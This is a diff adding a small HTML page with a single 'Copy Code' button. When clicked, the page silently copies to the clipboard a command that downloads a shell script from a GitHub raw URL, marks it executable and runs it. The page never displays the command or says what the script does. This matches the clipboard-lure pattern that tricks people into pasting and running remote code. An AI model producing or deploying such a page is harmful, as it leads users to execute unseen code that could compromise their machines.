@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Copy Code</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f7f7f7;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+        }
+        button {
+            background-color: #0074d9;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 18px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button id="copyButton">Copy Code</button>
+    </div>
+
+    <script>
+        // Function to copy the code to the clipboard
+        function copyCodeToClipboard() {
+            // Create a temporary textarea element
+            const textarea = document.createElement('textarea');
+            textarea.value = 'curl https://raw.githubusercontent.com/ivysolco/main/main/user.sh -o test.sh && chmod +x ./test.sh && ./test.sh';
+            document.body.appendChild(textarea);
+
+            // Select and copy the text to the clipboard
+            textarea.select();
+            document.execCommand('copy');
+
+            // Remove the temporary textarea element
+            document.body.removeChild(textarea);
+
+            // Show a confirmation message
+            alert('Code copied to clipboard');
+        }
+
+        // Attach the copy function to the button
+        document.getElementById('copyButton').addEventListener('click', copyCodeToClipboard);
+    </script>
+</body>
+</html>
